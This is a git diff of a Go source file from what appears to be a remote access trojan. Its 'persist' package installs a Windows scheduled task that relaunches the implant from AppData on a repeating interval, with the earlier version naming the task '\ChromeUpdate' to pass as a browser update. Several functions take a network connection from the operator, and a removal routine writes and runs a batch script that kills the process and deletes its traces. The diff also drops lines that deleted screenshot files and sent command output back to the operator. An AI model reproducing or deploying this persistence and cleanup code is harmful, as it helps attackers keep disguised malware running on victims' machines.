@@ -3,6 +3,8 @@ package persist
 import (
 	"bufio"
 	"bytes"
+
+	//"bytes"
 	"fmt"
 	"log"
 	"net"
@@ -21,10 +23,10 @@ func Schedule(connection net.Conn) (err error) {
 
 	home, _ := os.UserHomeDir()
 
-	appdata := filepath.Join(home, "AppData\\Roaming")
 	exe_name := filepath.Base(os.Args[0])
-	appdata_with_exe := appdata + "\\" + exe_name
 	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]
+	appdata := filepath.Join(home, "AppData\\Roaming", without_ext)
+	appdata_with_exe := appdata + "\\" + exe_name
 	xml_path := appdata + "\\schtask.xml"
 
 	fmt.Println("appdata : ", appdata)
@@ -33,59 +35,55 @@ func Schedule(connection net.Conn) (err error) {
 	fmt.Println("without_exe : ", without_ext)
 	fmt.Println("xml_path : ", xml_path)
 
-	appdata_cd_command := os.Chdir(appdata)
+	appdata_cd_command := os.Chdir(filepath.Join(home, "AppData\\Roaming", without_ext))
 	if appdata_cd_command != nil {
 		panic(appdata_cd_command)
 	}
 
-	xml_data := "<Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\" version=\"1.4\">" +
-		"\n<RegistrationInfo>" +
-		"\n<Author>Anon\\Anonymous</Author>" +
-		"\n<URI>\\ChromeUpdate</URI>" +
-		"\n</RegistrationInfo>" +
-		"\n<Triggers>" +
-		"\n<TimeTrigger>" +
-		"\n<Repetition>" +
-		"\n<Interval>PT" + command + "M</Interval>" +
-		"\n<StopAtDurationEnd>false</StopAtDurationEnd>" +
-		"\n</Repetition>" +
-		"\n<StartBoundary>2015-05-06T23:24:00</StartBoundary>" +
-		"\n<Enabled>true</Enabled>" +
-		"\n</TimeTrigger>" +
-		"\n</Triggers>" +
-		"\n<Principals>" +
-		"\n<Principal id=\"Author\">" +
-		"\n<UserId>S-1-5-21-3114169349-1207689747-4105279568-1001</UserId>" +
-		"\n<LogonType>InteractiveToken</LogonType>" +
-		"\n<RunLevel>LeastPrivilege</RunLevel>" +
-		"\n</Principal>" +
-		"\n</Principals>" +
-		"\n<Settings>" +
-		"\n<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" +
-		"\n<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" +
-		"\n<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>" +
-		"\n<AllowHardTerminate>true</AllowHardTerminate>" +
-		"\n<StartWhenAvailable>false</StartWhenAvailable>" +
-		"\n<RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>" +
-		"\n<IdleSettings>" +
-		"\n<StopOnIdleEnd>true</StopOnIdleEnd>" +
-		"\n<RestartOnIdle>false</RestartOnIdle>" +
-		"\n</IdleSettings>" +
-		"\n<AllowStartOnDemand>true</AllowStartOnDemand>" +
-		"\n<Enabled>true</Enabled>" +
-		"\n<Hidden>false</Hidden>" +
-		"\n<RunOnlyIfIdle>false</RunOnlyIfIdle>" +
-		"\n<DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>" +
-		"\n<UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>" +
-		"\n<WakeToRun>false</WakeToRun>" +
-		"\n<ExecutionTimeLimit>PT72H</ExecutionTimeLimit>" +
-		"\n<Priority>7</Priority>" +
-		"\n</Settings>" +
-		"\n<Actions Context=\"Author\">" +
-		"\n<Exec>" +
-		"\n<Command>" + appdata_with_exe + "</Command>" +
-		"\n</Exec>" +
-		"\n</Actions>" +
+	xml_data := "<?xml version=\"1.0\" encoding=\"UTF-16\"?>" +
+		"\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" +
+		"\n  <RegistrationInfo>" +
+		"\n  </RegistrationInfo>" +
+		"\n  <Triggers>" +
+		"\n    <TimeTrigger>" +
+		"\n      <Repetition>" +
+		"\n        <Interval>PT" + command + "M</Interval>" +
+		"\n        <StopAtDurationEnd>false</StopAtDurationEnd>" +
+		"\n      </Repetition>" +
+		"\n      <StartBoundary>2015-05-06T23:24:00</StartBoundary>" +
+		"\n      <Enabled>true</Enabled>" +
+		"\n    </TimeTrigger>" +
+		"\n  </Triggers>" +
+		"\n  <Principals>" +
+		"\n    <Principal id=\"Author\">" +
+		"\n      <LogonType>InteractiveToken</LogonType>" +
+		"\n      <RunLevel>LeastPrivilege</RunLevel>" +
+		"\n    </Principal>" +
+		"\n  </Principals>" +
+		"\n  <Settings>" +
+		"\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" +
+		"\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" +
+		"\n    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>" +
+		"\n    <AllowHardTerminate>true</AllowHardTerminate>" +
+		"\n    <StartWhenAvailable>false</StartWhenAvailable>" +
+		"\n    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>" +
+		"\n    <IdleSettings>" +
+		"\n      <StopOnIdleEnd>true</StopOnIdleEnd>" +
+		"\n      <RestartOnIdle>false</RestartOnIdle>" +
+		"\n    </IdleSettings>" +
+		"\n    <AllowStartOnDemand>true</AllowStartOnDemand>" +
+		"\n    <Enabled>true</Enabled>" +
+		"\n    <Hidden>false</Hidden>" +
+		"\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>" +
+		"\n    <WakeToRun>false</WakeToRun>" +
+		"\n    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>" +
+		"\n    <Priority>7</Priority>	" +
+		"\n  </Settings>" +
+		"\n  <Actions Context=\"Author\">" +
+		"\n    <Exec>" +
+		"\n      <Command>" + appdata_with_exe + "</Command>" +
+		"\n    </Exec>" +
+		"\n  </Actions>" +
 		"\n</Task>"
 
 	file, err := os.Create("schtask.xml")
@@ -140,26 +138,19 @@ func Schedule(connection net.Conn) (err error) {
 
 func Remove(connection net.Conn) (err error) {
 
-	home, _ := os.UserHomeDir()
-	appdata := filepath.Join(home, "AppData\\Roaming")
 	exe_name := filepath.Base(os.Args[0])
-	appdata_with_exe := appdata + "\\" + exe_name
 	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]
-	xml_path := appdata + "\\schtask.xml"
+	home, _ := os.UserHomeDir()
+	appdata := filepath.Join(home, "AppData\\Roaming", without_ext)
+	//appdata_with_exe := appdata + "\\" + exe_name
+	//xml_path := appdata + "\\schtask.xml"
 
-	content := "schtasks /DELETE /TN " + without_ext + " /F" +
-		"\ndel " + xml_path +
-		"\ndel %AppData%\\\\image.bmp" +
-		"\ndel %AppData%\\\\ss.png" +
-		"\ntaskkill /im " + exe_name + " /f" +
-		"\ndel " + appdata_with_exe +
-		"\n" +
-		"\nrem SETLOCAL" +
-		"\nrem SET someOtherProgram=SomeOtherProgram.exe" +
-		"\nrem TASKKILL /IM \"%someOtherProgram%\"" +
-		"\nrem DEL \"%~f0\""
+	content := "powershell -command \"Start-Sleep -s 5\"" + "\n" +
+		"schtasks /DELETE /TN " + without_ext + " /F" + "\n" +
+		"taskkill /im " + exe_name + " /f" + "\n" +
+		"del " + appdata + "/f /q"
 
-	file, err := os.Create("clean.bat")
+	file, err := os.Create("uninstall.bat")
 
 	if err != nil {
 		log.Fatal(err)
@@ -171,7 +162,7 @@ func Remove(connection net.Conn) (err error) {
 	}
 	err = file.Close()
 
-	cmd := exec.Command("powershell", "./clean.bat")
+	cmd := exec.Command("powershell", "./uninstall.bat")
 	var out bytes.Buffer
 	var stderr bytes.Buffer
 	cmd.Stdout = &out
@@ -179,20 +170,7 @@ func Remove(connection net.Conn) (err error) {
 	error := cmd.Run()
 	if error != nil {
 		fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
-		return
 	}
-
-	c := exec.Command("powershell", "del", "clean.bat")
-	if err := c.Run(); err != nil {
-		fmt.Println("Error: ", err)
-	}
-
-	nbytes, erro := connection.Write([]byte(out.String()))
-	if erro != nil {
-		panic(erro)
-	}
-	fmt.Println("[+]", nbytes, "bytes written\n")
 
 	return
-
 }
